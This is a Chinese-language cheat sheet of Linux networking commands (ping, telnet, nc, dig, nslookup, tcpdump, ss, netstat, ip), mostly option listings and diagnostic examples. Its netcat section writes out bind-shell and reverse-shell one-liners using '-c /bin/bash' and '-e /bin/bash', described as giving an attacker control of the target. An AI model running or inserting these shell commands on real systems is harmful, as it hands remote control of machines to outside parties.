# 常用命令积累

## 一、网络相关

### 网络查询和诊断

#### ping

ping命令是用来测试数据包能否透过IP协议到达特定主机。

ping的运作原理是向目标主机传出一个ICMP的请求回显数据包，并等待接收回显回应数据包。程序会按时间和成功响应的次数估算丢失数据包率（丢包率）和数据包往返时间（网络时延，Round-trip delay time）。

```bash
用法
  ping [选项] <目标地址>

选项:
  <目标地址>         DNS名称或IP地址
  -a                 使用可听化的ping（收到回复时发出声音）
  -A                 使用自适应ping
  -B                 固定源地址
  -c <次数>          收到<count>次回复后停止
  -D                 打印时间戳
  -d                 使用SO_DEBUG套接字选项
  -f                 洪泛ping（高速发送）
  -h                 显示帮助信息并退出
  -I <接口>          指定接口名称或地址
  -i <间隔>          每次发送数据包之间的间隔秒数
  -L                 禁止多播数据包的环回
  -l <预载>          在等待回复的同时发送<预载>数量的数据包
  -m <标记>          为外出数据包添加标记
  -M <pmtud选项>     定义MTU发现模式，可以是<do|dont|want>之一
  -n                 不进行DNS名称解析
  -O                 报告未完成的回复
  -p <模式>          填充字节的内容
  -q                 安静模式输出
  -Q <tclass>        使用服务质量<tclass>位
  -s <大小>          指定要发送的数据字节数
  -S <大小>          指定SO_SNDBUF套接字选项值
  -t <ttl>           定义生存时间(TTL)
  -U                 打印用户到用户延迟
  -v                 详细输出
  -V                 打印版本信息并退出
  -w <截止时间>      等待回复的截止时间(秒)
  -W <超时>          等待响应的时间

IPv4选项:
  -4                 使用IPv4
  -b                 允许ping广播地址
  -R                 记录路由
  -T <时间戳>        定义时间戳类型，可以是<tsonly|tsandaddr|tsprespec>之一

IPv6选项:
  -6                 使用IPv6
  -F <流标签>        定义流标签，默认为随机
  -N <节点信息选项>  使用icmp6节点信息查询，可以尝试使用<help>作为参数
  
  例子：
 ping -c 4 example.com
发送4个数据包后自动停止，最常用的连通性测试
ping -c 10 -i 0.5 example.com
以0.5秒间隔发送10个包，平衡速度与可读性
ping -c 5 -n 192.168.1.1
不进行DNS解析，直接测试IP地址连通性

ping -c 10 -D example.com
带时间戳的ping，分析网络延迟波动
ping -c 100 -s 1472 example.com
发送大尺寸数据包(1472字节)，测试MTU问题（标准以太网MTU 1500 - 28字节IP/ICMP头）
ping -c 5 -t 64 -R example.com
IPv4记录路由，查看数据包经过的路径(部分路由器可能不支持)

ping -f -c 100 example.com (需要root权限)
洪泛模式，快速发送100个包测试网络性能
ping -c 50 -l 10 example.com
预载10个包，测试网络突发负载能力

ping -c 4 -q example.com
安静模式，只显示摘要信息，适合脚本使用
ping -c 5 -w 10 example.com
最多等待10秒后停止，即使未收到5个回复
ping -c 3 -I eth0 example.com
通过指定网络接口(eth0)测试连接
ping -c 4 -4 example.com
强制使用IPv4协议
ping -c 4 -6 example.com
强制使用IPv6协议
ping -c 5 -W 2 example.com
设置单个包等待响应超时为2秒，快速检测连接状态

ping -i 5 example.com每5秒发送一个包，持续监控连接稳定性(按Ctrl+C停止)
```



#### telnet

​	Telnet是一种应用层协议，使用于互联网及局域网中，使用虚拟终端的形式，提供双向、以文字字符串为主的命令行接口交互功能。属于TCP/IP协议族的其中之一，是互联网远程登录服务的标准协议和主要方式，常用于服务器的远程控制，可供用户在本地主机执行远程主机上的工作。

用法

```
命令行用法: telnet [-4] [-6] [-8] [-E] [-L] [-S tos] [-a] [-c] [-d] [-e 字符] [-l 用户]
        [-n 跟踪文件] [-b 主机别名] [-r]
 [主机名 [端口号]]
选项说明：
-4：使用IPv4地址
-6：使用IPv6地址
-8：请求8位数据传输
-E：禁用转义字符
-L：禁用线路模式
-S tos：设置IP服务类型
-a：尝试自动登录
-c：不读取用户的telnetrc配置文件
-d：启用调试模式
-e 字符：设置转义字符
-l 用户：指定远程登录用户名
-n 跟踪文件：设置跟踪文件，记录会话
-b 主机别名：绑定到特定的本地主机别名
-r：远程登录模式(类似rlogin)

1. 基本连接
telnet example.com
连接到 example.com 的默认 telnet 端口(23)
2.测试端口是否开放
telnet 192.168.1.1 22
测试 192.168.1.1 的 SSH 端口(22)是否开放
3. 指定本地源地址
telnet -b 192.168.1.100 example.com 80
使用本地IP 192.168.1.100 作为源地址连接
4. 使用IPv4或IPv6
telnet -4 example.com 80    # 仅使用IPv4
telnet -6 ipv6.example.com 80  # 仅使用IPv6
5. 测试邮件服务器
telnet mail.example.com 25
连接到邮件服务器的SMTP端口(25)，可用于手动发送测试邮件
6. 指定转义字符
telnet -e ^] example.com
设置转义字符为 ^] (这是默认值，可用来退出telnet会话)
7. 启用调试模式
telnet -d example.com 80
启用调试模式，显示更详细的连接信息

交互式命令
在终端的命令行中直接输入telnet命令就可以进入到Telnet 交互式命令行界面中：
[root@localhost ~]# telnet
telnet>
open   [远程主机IP]   [端口号]  # 用来连接指定的远程主机和端口
telnet> open www.baidu.com 443
Trying 36.152.44.93...
Connected to www.baidu.com.
Escape character is '^]'. # 使用"^]"退回到Telnet 交互式命令行界面 Escape 字符可以自定义设置，具体可使用 set escape [Escape字符]命令来设置新的 Escape 字符。
telnet> status  #显status示当前连接的状态，帮助用户了解当前的会话状态信息。
No connection.
Escape character is '^]'.
telnet> close # close 命令关闭当前的 Telnet 会话
Connected closed.
telnet> quit  # 退出 Telnet 客户端
[root@localhost ~]#
display：显示 Telnet 设置。
send：发送控制字符（如 Ctrl+C）
```



#### nc/netcat

​	 Netcat（也称为nc或netcat-openbsd）是一个非常强大和灵活的网络工具，使用UDP和TCP协议，它主要用于创建TCP或UDP双向网络连接。，集端口扫描、网络调试、数据传输、shell交互等功能于一体。Netcat可以作为一个简单的终端程序，也可以作为一个强大的网络诊断、监控和攻击工具。



用法

```
用法: nc [-46cDdFhklNnrStUuvz] [-C 证书文件] [-e 名称] [-H 哈希] [-I 长度]
          [-i 间隔] [-K 密钥文件] [-M ttl] [-m 最小ttl] [-O 长度]
          [-o staple文件] [-P 代理用户名] [-p 源端口] [-R CA文件]
          [-s 源地址] [-T 关键词] [-V 路由表] [-W 接收限制] [-w 超时]
          [-X 代理协议] [-x 代理地址[:端口]] [-Z 对等证书文件]
          [目标地址] [端口]
        命令摘要:
                -4              仅使用 IPv4
                -6              仅使用 IPv6
                -C 证书文件     公钥文件
                -c              使用 TLS
                -D              启用套接字调试选项
                -d              从标准输入分离
                -e 名称         对等证书中必需的名称
                -F              传递套接字文件描述符
                -H 哈希         对等证书的哈希字符串
                -h              显示此帮助文本
                -I 长度         TCP接收缓冲区长度
                -i 间隔         发送行和扫描端口的延迟间隔
                -K 密钥文件     私钥文件
                -k              保持入站套接字打开，允许多次连接
                -l              监听模式，用于接收连接
                -M ttl          传出数据包的TTL/跳数限制
                -m 最小ttl      最小接收TTL/跳数限制
                -N              在标准输入EOF后关闭网络套接字
                -n              禁用名称/端口解析
                -O 长度         TCP发送缓冲区长度
                -o staple文件   OCSP装订文件
                -P 代理用户     代理认证用户名
                -p 端口         指定用于远程连接的本地端口
                -R CA文件       CA证书包
                -r              随机化远程端口
                -S              启用TCP MD5签名选项
                -s 源地址       本地源地址
                -T 关键词       TOS值或TLS选项
                -t              响应TELNET协商
                -U              使用UNIX域套接字
                -u              UDP模式
                -V 路由表       指定备用路由表
                -v              详细模式
                -W 接收限制     接收指定数量的数据包后终止
                -w 超时         连接和最终网络读取的超时
                -X 协议         代理协议: "4", "4A", "5" (SOCKS) 或 "connect"
                -x 地址[:端口]  指定代理地址和端口
                -Z              对等证书文件
                -z              零I/O模式，仅扫描 [用于端口扫描]
        端口号可以是单个或范围: 起始-结束 [包含两端]
        
常用功能：
1.端口扫描
nc 192.168.1.1 80 #扫描192.168.1.1的80端口是否开放
nc 192.168.1.1 1-100 # 扫描192.168.1.1的1-100端口，适合快速排查常用端口。
nc 192.168.1.1 21,22,80,443 #扫描192.168.1.1的FTP,SSH,HTTP,HTTPS的服务端口
nc -u 192.168.1.1 53 #扫描192.168.1.1的53端口是否开放

2.数据传输：双向文件/目录传输
单文件传输：
接收端（先启动，监听端口）：nc -lp 8888 > receive.txt #监听8888端口，将接收的数据写入到receive.txt
发送端（连接接收端）：nc -n 192.168.1.100 8888 < send.txt #禁用名称/端口解析，连接192.168.1.100的8888端口，将send.txt内容发送到接收端

目录传输：
接收端： nc -lp 8888 | tar -xvf - #监听8888端口接收数据，并通过tar解压标准传输读取到的文件
发送端：tar -cvf - ./xxx | nc -n 192.168.1.100 8888 #将目标目录打包，通过管道传输给接收端

文本传输：
服务端：nc -lvp 8888
客户端：nc 192.168.1.100 8888 #连接成功后，双方输入的文本会实时显示在对方终端上

3.排查网络连通性
验证端口连通性：nc -zv 192.168.1.1 80 #若输出“succeeded!”，说明端口开放且网络可达；若“Connection refused”，说明端口关闭；若超时，可能是防火墙拦截。
获取服务Banner（服务启动时返回的标识信息，有版本，类型）信息：nc -v 192.168.1.1 80 #连接成功后，按回车即可看到HTTP服务的Banner（如“Apache/2.4.49”）
模拟HTTP请求，验证Web服务是否正常响应：
nc 192.168.1.1 80
GET / HTTP/1.1
Host: 192.168.1.1

4.Shell交互
正向Shell：目标机：nc -lvp 8888 -c /bin/bash
攻击机：nc 192.168.1.100 8888 # 连接成功后，攻击者可直接执行系统命令（如ls、dir）控制目标机。
反向Shell：攻击者：nc -lvp 8888
目标机：nc 192.168.1.200 8888 -e /bin/bash # 目标机连接后，攻击者即可获得shell权限。

高级用法：
1.端口转发
将目标端口的流量转发到指定IP和端口，实现代理或端口映射：
nc -lvp 8080 -c "nc 192.168.1.1 80"  # 监听本地8080端口，所有访问8080的流量都会转发到192.168.1.1的80端口（实现HTTP代理）。
2.加密传输
Netcat默认传输不加密，可结合OpenSSL实现加密传输：
接收端：openssl s_server -accept 8888 -quiet | tar -xvf -
发送端：tar -cvf - ./testdir | openssl s_client -connect 192.168.1.100:8888 -quiet
解析：通过SSL加密传输tar包，防止数据被窃听。
3.多端口监听（同时监听多个端口）
GNU Netcat支持同时监听多个端口，适合批量调试：
nc -lvp 8888 & nc -lvp 9999
解析：用&后台运行，同时监听8888和9999端口。
```



#### dig

dig（domain information group）是常用的域名查询工具，可以从DNS域名服务器查询主机地址信息，获取到详细的域名信息。




用法

```
用法:  dig [@全局服务器] [域名] [查询类型] [查询类别] {查询选项}
            {全局-d-选项} 主机 [@本地服务器] {本地-d-选项}
            [ 主机 [@本地服务器] {本地-d-选项} [...]]
其中:  domain    是域名系统中的域名
        q-class  是其中之一 (in,hs,ch,...) [默认: in]
        q-type   是其中之一 (a,any,mx,ns,soa,hinfo,axfr,txt,...) [默认:a]
                 (对于ixfr类型，使用 ixfr=版本)
        q-opt    是其中之一:
                 -4                  (仅使用IPv4查询传输)
                 -6                  (仅使用IPv6查询传输)
                 -b 地址[#端口]      (绑定到源地址/端口)
                 -c 类别             (指定查询类别)
                 -f 文件名           (批处理模式)
                 -k 密钥文件         (指定tsig密钥文件)
                 -m                  (启用内存使用调试)
                 -p 端口             (指定端口号)
                 -q 名称             (指定查询名称)
                 -r                  (不读取 ～/.digrc)
                 -t 类型             (指定查询类型)
                 -u                  (以微秒而非毫秒显示时间)
                 -x 点分表示法       (反向查询的快捷方式)
                 -y [hmac:]名称:密钥 (指定命名的base64 tsig密钥)
        d-opt    格式为 +关键字[=值], 其中关键字是:
                 +[no]aaflag         (在查询中设置AA标志)
                 +[no]aaonly         (在查询中设置AA标志)
                 +[no]additional     (控制附加部分的显示)
                 +[no]adflag         (在查询中设置AD标志(默认开启))
                 +[no]all            (设置或清除所有显示标志)
                 +[no]answer         (控制应答部分的显示)
                 +[no]authority      (控制授权部分的显示)
                 +[no]badcookie      (重试BADCOOKIE响应)
                 +[no]besteffort     (尝试解析甚至非法消息)
                 +bufsize[=###]      (设置EDNS0最大UDP包大小)
                 +[no]cdflag         (在查询中设置检查禁用标志)
                 +[no]class          (控制记录中类别的显示)
                 +[no]cmd            (控制命令行的显示 - 全局选项)
                 +[no]comments       (控制包头和区域名称注释的显示)
                 +[no]cookie         (向请求添加COOKIE选项)
                 +[no]crypto         (控制记录中加密字段的显示)
                 +[no]defname        (使用搜索列表)
                 +[no]dnssec         (请求DNSSEC记录)
                 +domain=###         (设置默认域名)
                 +[no]dscp[=###]     (设置DSCP值为### [0..63])
                 +[no]edns[=###]     (设置EDNS版本) [0]
                 +ednsflags=###      (设置EDNS标志位)
                 +[no]ednsnegotiation (设置EDNS版本协商)
                 +ednsopt=###[:value] (发送指定的EDNS选项)
                 +noednsopt          (清除+ednsopt选项列表)
                 +[no]expandaaaa     (展开AAAA记录)
                 +[no]expire         (请求到期时间)
                 +[no]fail           (在SERVFAIL时不尝试下一个服务器)
                 +[no]header-only    (发送没有问题部分的查询)
                 +[no]identify       (在简短回答中标识响应者)
                 +[no]idnin          (解析IDN名称 [默认在终端上开启])
                 +[no]idnout         (转换IDN响应 [默认在终端上开启])
                 +[no]ignore         (对于截断(TC)响应不回退到TCP)
                 +[no]keepalive      (请求EDNS TCP keepalive)
                 +[no]keepopen       (在查询之间保持TCP套接字打开)
                 +[no]mapped         (允许通过IPv6映射的IPv4)
                 +[no]multiline      (以扩展格式打印记录)
                 +ndots=###          (设置搜索NDOTS值)
                 +[no]nsid           (请求名称服务器ID)
                 +[no]nssearch       (搜索所有权威名称服务器)
                 +[no]onesoa         (AXFR仅打印一条soa记录)
                 +[no]opcode=###     (设置请求的操作码)
                 +padding=###        (设置填充块大小 [0])
                 +[no]qr             (发送前打印问题)
                 +[no]question       (控制问题部分的显示)
                 +[no]raflag         (在查询中设置RA标志)
                 +[no]rdflag         (递归模式)
                 +[no]recurse        (递归模式)
                 +retry=###          (设置UDP重试次数) [2]
                 +[no]rrcomments     (控制每条记录注释的显示)
                 +[no]search         (设置是否使用搜索列表)
                 +[no]short          (仅显示答案的简短形式 - 全局选项)
                 +[no]showsearch     (使用中间结果显示搜索过程)
                 +[no]split=##       (将hex/base64字段拆分为块)
                 +[no]stats          (控制统计信息的显示)
                 +subnet=地址        (设置edns-client-subnet选项)
                 +[no]tcflag         (在查询中设置TC标志)
                 +[no]tcp            (TCP模式)
                 +timeout=###        (设置查询超时时间，秒) [5]
                 +[no]trace          (从根开始跟踪委派链 [+dnssec])
                 +tries=###          (设置UDP尝试次数) [3]
                 +[no]ttlid          (控制记录中TTL的显示)
                 +[no]ttlunits       (以人类可读单位显示TTL)
                 +[no]unexpected     (打印来自意外来源的回复 默认=关闭)
                 +[no]unknownformat  (以RFC 3597 "unknown"格式打印RDATA)
                 +[no]vc             (TCP模式)
                 +[no]yaml           (以YAML格式呈现结果)
                 +[no]zflag          (在查询中设置Z标志)
        全局d-opts和服务器(主机名前)影响所有查询。
        本地d-opts和服务器(主机名后)仅影响该次查询。
        -h                           (打印帮助并退出)
        -v                           (打印版本并退出)

输出结果解释
[root@localhost ~]# dig
; <<>> DiG 9.16.23-RH <<>> # dig工具的版本信息
;; global options: +cmd  #全局的设置选项
;; Got answer: #接受到DNS服务器的响应
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 2988 #响应头信息，比较重要的是 status，如果 status 的值为 NOERROR ，则说明本次查询成功。id:xxx是查询的事务id。
;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1
# 显示DNS标志以及各部分的统计：一个请求，十三个应答，零个权威记录，一个附加记录

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;.                              IN      NS  # 查询内容：显示要查询的域名以及查询的服务

;; ANSWER SECTION: # 返回了查询的结果
被查询的服务器名称    TTL每次刷新 查询类别 查询类型 与域名关联的别名和 IP 地址
.                       1526    IN      NS      h.root-servers.net.
.                       1526    IN      NS      g.root-servers.net.
.                       1526    IN      NS      l.root-servers.net.
.                       1526    IN      NS      i.root-servers.net.
.                       1526    IN      NS      j.root-servers.net.
.                       1526    IN      NS      k.root-servers.net.
.                       1526    IN      NS      c.root-servers.net.
.                       1526    IN      NS      m.root-servers.net.
.                       1526    IN      NS      d.root-servers.net.
.                       1526    IN      NS      f.root-servers.net.
.                       1526    IN      NS      a.root-servers.net.
.                       1526    IN      NS      e.root-servers.net.
.                       1526    IN      NS      b.root-servers.net.

;; Query time: 13 msec #请求所花费的时间
;; SERVER: 114.114.114.114#53(114.114.114.114)  #使用的DNS服务器
;; WHEN: Sun Jan 25 17:13:41 CST 2026 #当前的时间 
;; MSG SIZE  rcvd: 251  #查询信息的大小

常用命令
dig example.com +short #只显示应答部分
dig @114.114.114.114 example.com A #指定DNS服务器
dig -x 8.8.8.8 #反向查询DNS（PTR记录）
dig example.com +trace #显示从根服务器到目标域名的完整解析路径
```



#### host

host命令是用于 DNS 查询的实用工具，主要用来查找域名的 IP 地址，或者进行反向查询，找出 IP 地址对应的域名。



用法

```
host [-aACdlnrsTUwv] [-c class] [-N ndots] [-p port] [-R number] [-t type] [-W wait] [-m flag] [ [-4] | [-6] ] [-v] [-V] {name} [server]

-4: 此选项指定仅使用 IPv4 进行查询传输。
-6: 此选项指定仅使用 IPv6 进行查询传输。
-a: -a（"全部"）选项通常等同于 -v -t ANY。它也会影响 -l 列出区域选项的行为。
-A: -A（"几乎全部"）选项等同于 -a，只是输出中省略了 RRSIG、NSEC 和 NSEC3 记录。
-c class: 此选项指定查询类别，可用于查找 HS（Hesiod）或 CH（Chaosnet）类资源记录。默认类别是 IN（Internet）。
-C: 此选项指示检查一致性，即 host 从该区域的所有权威名称服务器查询区域名称的 SOA 记录。名称服务器列表由该区域的 NS 记录定义。
-d: 此选项打印调试跟踪信息，等同于 -v 详细选项。
-l: 此选项告诉名称服务器列出区域，即 host 命令执行区域名称的区域传输，并打印出 NS、PTR 和地址记录（A/AAAA）。
-l -a 选项组合会打印区域中的所有记录。
-N ndots: 此选项指定名称中必须包含的点数（ndots），才能被视为绝对名称。默认值是在 /etc/resolv.conf 中使用 ndots 语句定义的值，如果没有 ndots 语句，则为 1。点数较少的名称被视为相对名称，并在 /etc/resolv.conf 中 search 或 domain 指令列出的域中搜索。
-p port: 此选项指定要在服务器上查询的端口。默认值为 53。
-r: 此选项指定非递归查询；设置此选项会清除查询中的 RD（需要递归）位。这意味着接收查询的名称服务器不会尝试解析名称。-r 选项使 host 能够通过执行非递归查询来模拟名称服务器的行为，并期望收到可以指向其他名称服务器的响应。
-R number: 此选项指定 UDP 查询的重试次数。如果 number 为负数或零，重试次数将静默设置为 1。默认值为 1，或者如果设置了 /etc/resolv.conf 中的 attempts 选项，则使用该值。
-s: 此选项告诉 host，如果任何服务器以 SERVFAIL 响应，则不要将查询发送到下一个名称服务器，这与正常的存根解析器行为相反。
-t type: 此选项指定查询类型。type 参数可以是任何可识别的查询类型：CNAME、NS、SOA、TXT、DNSKEY、AXFR 等。
当未指定查询类型时，host 会自动选择适当的查询类型。默认情况下，它会查找 A、AAAA 和 MX 记录。如果给出 -C 选项，则查询 SOA 记录。如果名称是点分十进制 IPv4 地址或冒号分隔的 IPv6 地址，host 会查询 PTR 记录。
如果选择了 IXFR 查询类型，可以通过附加等号（=）后跟起始序列号来指定起始序列号，例如：-t IXFR=12345678。
-T; -U: 此选项指定使用 TCP 或 UDP。默认情况下，host 在进行查询时使用 UDP；-T 选项使其在查询名称服务器时使用 TCP 连接。对于需要 TCP 的查询（如区域传输（AXFR）请求），会自动选择 TCP。ANY 类型的查询默认使用 TCP，但可以通过 -U 强制初始使用 UDP。
-m flag: 此选项设置内存使用调试：flag 可以是 record、usage 或 trace。可以多次指定 -m 选项以设置多个标志。
-v: 此选项设置详细输出，等同于 -d 调试选项。也可以通过在 /etc/resolv.conf 中设置 debug 选项来启用详细输出。
-V: 此选项打印版本号并退出。
-w: 此选项设置"永远等待"：查询超时设置为可能的最大值。
-W wait: 此选项设置等待超时的长度，指示 host 应等待最多 wait 秒以获取回复。如果 wait 小于 1，则等待间隔设置为 1 秒。
默认情况下，host 等待 UDP 响应 5 秒，等待 TCP 连接 10 秒。这些默认值可以通过 /etc/resolv.conf 中的 timeout 选项覆盖。

常用命令
host -t NS example.com      # 指定记录类型，查询名称服务器记录
host 8.8.8.8                # IPv4 反向查询
host example.com 114.114.114.114  # 使用 114 DNS 查询
host -v example.com         # 详细输出模式
host -a example.com         # 显示所有 DNS 记录 (等同于 -v -t ANY)
host -C example.com         # 比较所有权威名称服务器上的 SOA 记录
```



#### nslookup

nslookup 用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题

安装方法：yum -y install bind-utils

```bash
#nslookup命令格式
nslookup –option1 –option2 host-to-find dns-server
```

交互模式

1.直接查询域名（host [server]）：以默认的 上连DNS服务器进行域名查询

```bash
#案例
[root@localhost ~]# nslookup
> www.baidu.com
Server:         192.168.142.2 // 上连的DNS服务器
Address:        192.168.142.2#53 // 上连的DNS服务器的IP地址与端口号

Non-authoritative answer: // 非权威答案，即从上连DNS服务器的本地缓存中读取出的值，而非实际去查询到的值
www.baidu.com   canonical name = www.a.shifen.com. // 说明www.baidu.com有个别名叫www.a.shifen.com
Name:   www.a.shifen.com    // 域名www.a.shifen.com
Address: 220.181.38.149     // 对应的IP地址之一,对应的描述信息为“北京市 百度网讯科技”
Name:   www.a.shifen.com    // 域名www.a.shifen.com
Address: 220.181.38.150     // 对应的IP地址之二
```

2.server [domain]：先使用默认的 上连DNS服务器对domain的IP地址进行查询，然后将查询到的服务器作为新的上连DNS服务器。

lserver [domain]：取本地的第一台DNS服务器来查询domain的IP地址，并将之作为当前默认上连DNS服务器。（lserver中的首字母l就是local的意思）

3.set `<opts> [=<value>]`：设置指定选项

选项包括：

```bash
all：此关键字打印常用选项的当前值。同时也会显示当前默认服务器和主机的信息。
class=value：此关键字将查询类别更改为以下之一：
IN：互联网类别
CH：Chaos类别
HS：Hesiod类别
ANY：通配符
类别指定信息的协议组。默认值为IN；此关键字的缩写是cl。

nodebug：此关键字开启或关闭完整响应数据包以及搜索过程中的任何中间响应数据包的显示。默认值为nodebug；此关键字的缩写是[no]deb。

nod2：此关键字开启或关闭调试模式。启用后会显示更多关于nslookup执行过程的详细信息。默认值为nod2。

domain=name：此关键字将搜索列表设置为name。

nosearch：如果查询请求包含至少一个点，但末尾没有点，此关键字会将域搜索列表中的域名依次附加到请求中，直到收到有效响应。默认值为search（启用搜索）。

port=value：此关键字将默认的TCP/UDP域名服务器端口从默认的53端口更改为value。此关键字的缩写是po。

querytype=value | type=value：此关键字将信息查询的类型更改为value。默认类型为A，然后是AAAA；这些关键字的缩写分别是q和ty。
A：查看主机的IPv4地址
AAAA：查看主机的IPv6地址
ANY：查看关于主机域的所有信息
CNAME：查找与别名对应的正式名字
HINFO：查找主机的CPU与操作系统类型
MINFO：查找邮箱信息
MX：查找邮件交换信息
NS：查找主机域的域名服务器
PTR：查找与给定IP地址匹配的主机名
RP：查找域负责人记录
SOA：查找域内的SOA地址
UINFO：查找用户信息
请注意，一次只能指定一种查询类型。只有在使用默认行为且未指定替代类型时，才会同时查询A和AAAA记录。

norecurse：此关键字指示域名服务器在没有所需信息时不向其他服务器查询。默认值为recurse（递归查询）；此关键字的缩写是[no]rec。

ndots=number：此关键字设置域名称中禁用搜索功能所需的点数（标签分隔符）。绝对名称（以点结尾的名称）始终会停止搜索。

retry=number：此关键字将重试次数设置为number。

timeout=number：此关键字将等待回复的初始超时间隔更改为number秒。

novc：此关键字指示在向服务器发送请求时始终使用虚拟电路（TCP连接）。novc（不使用虚拟电路，即使用UDP）是默认值。

nofail：当域名服务器返回SERVFAIL错误或引用响应时，此关键字决定是尝试下一个域名服务器（nofail），还是终止查询（fail）。默认值为nofail。
```

4.exit：退出



非交互模式

1.查询域名对应的IP地址：nslookup www.example.com

2.查询MX记录：nslookup -query/type=MX example.com 

3.反向解析：nslookup 192.168.1.1 #解析192.168.1.1的主机名

4.指定DNS服务器查询 ：nslookup www.example.com 8.8.8.8



#### tcpdump

基于命令行的数据包捕获和分析工具，支持多种网络协议和数据包格式

基本原理是通过在网卡上捕获数据包，并将这些数据包存储在本地文件中，以便后续离线分析。支持多种网络协议和数据包格式，包括 TCP、UDP、ICMP、HTTP、FTP、SMTP 、SIP等。

```bash
#基本语法
tcpdump [options] [expression]
#捕获控制参数
-i:指定要监听的网卡
-c:指定要捕获的数据包数量，当数量收集满足时退出
-s:指定幺捕获的数据包的大小
-w:将捕获的数据报保存到文件中
#显示控制参数
-n:以数字形式显示地址，而不是尝试解析为主机名
-A:以ASCII的格式显示数据包内容
-v:输出稍微详细的信息
-VV:输出详细的报文信息
#过滤参数
host host:捕获特定主机的数据包
net network:捕获特定网络的数据包
port port:捕获特定端口的数据包
src source:捕获特定源地址的数据包
dst destination:捕获特定目的地址的数据包
mac地址： 指定mac地址进行抓包； src mac:源mac dst mac:目的mac
protocol:捕获特定协议的数据包，包括ip、arp、rarp、tcp、udp等，
#读取和写入
-r <xxx.pcap>:从文件中读取数据
-w <xxx.pcap>:将捕获到的信息保存到文件中，且不分析和打印在屏幕中
#其他
-X:以十六进制和ASCII格式显示数据包内容
-t:在输出的每一行不打印时间戳
-tt:在每一行中数据非格式化的时间戳
-ttt:输出在本行和前面一行之间的时间差
-tttt:在每一行中输出data处理的默认格式的时间戳
-q:以安静的模式运行，减少输出信息
-d:将匹配信息包的代码以人类看得懂的汇编格式输出
-D:打印系统中所有可以监控

常见TCP报文的Flags
[S] ： SYN（开始连接）
[S.] 表示 SYN-ACK 报文
[.] : 没有 Flag
[P] : PSH（推送数据）
[F] : FIN （结束连接）
[R] : RST（重置连接）
```



#### arp



### 网络监控

#### iftop

#### vnstat



### 接口统计

#### ss

用于获取 socket 统计信息。

安装包：iproute

以下是 ss 常用参数的表格：

```bash
ss [ OPTIONS ] [ FILTER ]
参数	作用说明
-a,--all	显示所有连接（包括监听状态的套接字）
-t,--tcp	显示 TCP 连接
-u,--udp	显示 UDP 连接
-l,--listening	仅显示监听的套接字
-p,--processes	显示进程信息
-n,--numeric	不解析服务名，直接显示端口号
-r,--resolve	解析地址中的主机名
-s,--summary	显示套接字摘要统计信息
-i	显示内部信息，如 TCP 状态
-4,--ipv4	显示 IPv4 套接字
-6,--ipv6	显示 IPv6 套接字
-K	终止匹配的套接字
-A	显示指定的套接字类型，如 inet、unix、packet 等
#可以按照目标地址和端口进行过滤，例如：
# 匹配目标地址和端口
ss dst 192.168.1.5
ss dst 192.168.1.5:http
ss dst 192.168.1.5:443
# 匹配源地址和端口
ss src 192.168.1.10
ss src 192.168.1.10:ssh
ss src 192.168.1.10:22

#按照端口号大小进行过滤，例如：
#源端口号小于50
ss -tunl sport lt 50
#目标端口大于1024的连接
ss -ta dport gt 1024
#操作符：
<= le;>= ge;== eq;!= ne;> gt;< lt

#按照状态进行过滤
常见的状态有：established、syn-sent、syn-recv、fin-wait-1、fin-wait-2、time-wait、closed、close-wait、last-ack、listening和closing。
```

https://blog.csdn.net/qq_59334230/article/details/153781981?fromshare=blogdetail&sharetype=blogdetail&sharerId=153781981&sharerefer=PC&sharesource=m0_74140718&sharefrom=from_link



#### netstat

用于查询和统计网络连接的状态和数据传输情况。

安装包：net-tools

```bash
netstat [选项] [参数]
参数	作用说明
#协议相关
-t, --tcp           显示TCP协议连接
-u, --udp           显示UDP协议连接
-w, --raw           显示RAW协议连接
-x, --unix          显示Unix域套接字连接
--inet              仅显示IPv4连接
--inet6             仅显示IPv6连接
-s, --statistics    显示每个协议的统计信息

#连接状态选项
-a, --all           显示所有连接和监听端口
-l, --listening     仅显示监听状态的套接字
-e, --extend        显示扩展信息，可与-a一起使用获得更详细信息
-o, --timers        显示计时器信息（TCP连接的计时器）
-n, --numeric       以数字形式显示地址和端口号（不进行DNS解析）

#路由表选项
-r, --route         显示内核路由表
-N, --netlink       显示路由表中的网络链接信息
-F, --fib           显示FIB（转发信息库）路由表
-C, --cache         显示路由缓存

#网络接口选项
-i, --interfaces    显示网络接口列表
-g, --groups        显示IPv4/IPv6多播组成员
-c, --continuous    持续显示，每秒刷新一次

#进程/用户相关
-p, --program       显示使用套接字的进程ID和进程名称
-v, --verbose       详细模式
-W, --wide          不截断IP地址（显示完整的IPv6地址）
-Z, --context       显示SELinux安全上下文

#其他
-h, --help          显示帮助信息
-V, --version       显示版本信息
-b, --bytes         以字节为单位显示接口统计（默认为KB）
-d, --details       显示额外详细信息
-A, --address-family=AF[,AF...] 指定地址族，如inet,inet6,unix
-c, --continuous 连续显示网络状态信息。按 Ctrl + C 结束。

## 常用组合
netstat -tulnp # 查看所有监听端口及其对应进程
netstat -ant # 以数字形式查看所有TCP连接
netstat -i # 查看网络接口统计
netstat -ape # 显示扩展信息和进程
```



### 配置网络

#### ifconfig

#### ip

用于管理与配置网络接口和路由表

安装包：iproute

```bash
ip [ OPTIONS ] OBJECT { COMMAND | help }
选项：（但是用的很少）
-V, -Version        显示iproute2版本信息
-h, -human, -human-readable
                    以人类可读格式显示统计信息（自动选择单位）
-b, -batch <FILENAME>
                    从文件中读取命令
-s, -stats, -statistics
                    显示更详细的统计信息，多次使用会显示更多信息
-f, -family <AF>   指定地址族（inet, inet6, bridge, dnet, ipx, etc）
-4                  等同于 -family inet
-6                  等同于 -family inet6
-B                  等同于 -family bridge
-D                  等同于 -family dnet
-I                  等同于 -family ipx
-M                  等同于 -family mpls
-0                  等同于 -family link
-o, -oneline        每行输出一条记录，适用于脚本处理
-t, -timestamp      在监控模式中显示时间戳
-tt, -tstamp        在监控模式中显示更精确的时间戳
-json               以JSON格式输出
-p, -pretty         以美观的格式输出JSON

常用对象：
address：管理IP地址
link：网络设备管理
route：路由表项管理
rule：路由策略数据库中的规则
neighbor：管理ARP或NDISC缓存项
tunnel：IP隧道管理
netns：网络命名空间管理
monitor：网络状态监控
```



#### nmcli





### 网络传输

#### curl

#### wget

#### ssh + scp 

#### ftp

#### sftp

#### lftp



### 安全

#### firewall-cmd

#### iptables

#### selinux

#### getenforce

#### setenforce

#### sestatus



